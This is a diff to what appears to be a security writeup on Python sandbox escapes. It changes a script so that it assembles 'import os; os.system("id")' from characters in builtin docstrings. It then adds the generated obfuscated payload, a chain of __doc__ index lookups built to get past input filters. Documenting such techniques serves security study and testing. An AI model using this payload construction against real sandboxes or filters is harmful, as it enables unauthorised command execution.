@@ -240,8 +240,8 @@ def check_methods(needed_letters, obj, attrs):
     return best
 
 
-# goal = "exec('import os;os.system(\"id\")')"
-goal = string.printable
+goal = 'import os; os.system("id")'
+# goal = string.printable
 
 # Remove false positive (__doc__ != __builtins__.__doc__)
 objs = filter(lambda o: not o in ["__doc__"], dir(__builtins__))
@@ -258,6 +258,14 @@ result = "+".join(best[l] for l in goal)
 print()
 print(result)
 ```
+
+As an example, my Python 3.8.10 creates the following payload:
+
+{% code title="import os; os.system("id")" overflow="wrap" %}
+```python
+exit.eof[8]+id.__doc__[68]+map.__doc__[2]+dir.__doc__[5]+exit.eof[2]+exit.eof[1]+exit.eof[6]+dir.__doc__[5]+id.__doc__[38]+chr.__doc__[55]+exit.eof[6]+dir.__doc__[5]+id.__doc__[38]+exit.eof[9]+id.__doc__[38]+id.__doc__[18]+id.__doc__[38]+exit.eof[1]+exit.eof[10]+id.__doc__[68]+exit.eof[7]+open.__doc__[3084]+exit.eof[8]+dir.__doc__[0]+open.__doc__[3084]+exit.eof[16]
+```
+{% endcode %}
 
 </details>
 
